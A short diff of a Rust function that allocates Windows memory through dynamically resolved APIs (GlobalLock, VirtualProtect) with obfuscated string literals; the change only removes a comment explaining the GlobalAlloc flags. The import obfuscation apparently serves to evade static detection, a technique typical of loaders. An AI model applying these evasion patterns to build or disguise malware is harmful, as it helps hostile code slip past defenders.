@@ -12,7 +12,6 @@ pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
     let global_lock: GlobalLockFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GlobalLock\0").as_slice())?);
     let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"VirtualProtect\0").as_slice())?);
 
-    // GMEM_MOVEABLE | GMEM_ZEROINIT = 0x0002 | 0x0040 = 0x0042
     let h_mem = global_alloc(0x0042, size);
     if h_mem.is_null() {
         return Err(obf_lit!("GlobalAlloc failed").to_string());
